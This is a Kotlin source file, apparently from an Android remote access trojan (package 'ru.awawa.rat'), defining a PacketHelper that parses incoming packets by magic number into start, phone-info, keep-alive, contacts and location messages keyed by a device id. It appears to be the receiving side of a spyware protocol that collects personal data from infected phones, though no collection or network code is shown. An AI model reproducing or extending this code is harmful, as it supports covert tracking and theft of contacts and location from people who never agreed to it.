package ru.awawa.rat.worker.helper.protocol

import ru.awawa.rat.worker.helper.toInt


class PacketHelper {
    companion object {
        fun create(buffer: ByteArray): Packet? {

            var packet: Packet? = null
            when (buffer.sliceArray(0..3).toInt()) {
                MagicNumber.START.value -> {
                    val data = String(buffer.sliceArray(4 until buffer.count()))
                    val index = data.indexOf("\n")
                    val id = data.substring(0 until index)
                    packet = StartPacket(id)
                }

                MagicNumber.PHONE_INFO.value -> {
                    val data = String(buffer.sliceArray(4 until buffer.count()))
                    val index = data.indexOfFirst { it == '\n' }
                    val id = data.substring(0 until index)
                    val info = data.substring(index + 1)
                    packet = PhoneInfoPacket(id, info)
                }

                MagicNumber.KEEP_ALIVE.value -> {
                    val data = String(buffer.sliceArray(4 until buffer.count()))
                    val index = data.indexOf("\n")
                    val id = data.substring(0 until index)
                    packet = KeepAlivePacket(id)
                }

                MagicNumber.CONTACTS.value -> {
                    val data = String(buffer.sliceArray(4 until buffer.count()))
                    val index = data.indexOfFirst { it == '\n' }
                    val id = data.substring(0 until index)
                    val contacts = data.substring(index + 1)
                    packet = ContactsPacket(id, contacts)
                }

                MagicNumber.LOCATION.value -> {
                    val data = String(buffer.sliceArray(4 until buffer.count()))
                    val index = data.indexOfFirst { it == '\n' }
                    val id = data.substring(0 until index)
                    val location = data.substring(index + 1)
                    packet = LocationPacket(id, location)
                }
            }

            return packet
        }
    }
}
